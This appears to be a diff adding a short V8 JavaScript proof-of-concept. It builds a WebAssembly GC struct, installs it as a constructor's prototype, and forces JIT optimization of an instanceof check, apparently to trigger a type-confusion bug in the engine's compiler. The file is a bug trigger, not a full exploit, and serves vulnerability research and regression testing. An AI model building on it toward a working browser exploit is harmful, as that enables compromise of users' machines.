@@ -1,0 +1,25 @@
+<script>
+load('wasm-module-builder.js');
+let builder = new WasmModuleBuilder();
+let struct_type = builder.addStruct([makeField(kWasmI32, true)]);
+builder.addFunction('MakeStruct', makeSig([], [kWasmExternRef])).exportFunc().addBody([kExprI32Const, 42, kGCPrefix, kExprStructNew, struct_type, kGCPrefix, kExprExternConvertAny]);
+let instance = builder.instantiate();
+let evil_wasm_object = instance.exports.MakeStruct();
+
+function evil_ctor(){
+}
+
+function evil_cast_jit(evil_o){
+    global_collect_node_info = evil_o;    //  [+] get nodeinfo from PropertyCellStore
+    return evil_o instanceof evil_ctor; 
+}
+
+//  [+] hook its prototype chain
+evil_ctor.prototype = evil_wasm_object;
+
+%PrepareFunctionForOptimization(evil_cast_jit);
+evil_cast_jit(new evil_ctor());
+evil_cast_jit(new evil_ctor());
+%OptimizeFunctionOnNextCall(evil_cast_jit);
+evil_cast_jit(new evil_ctor());
+</script>
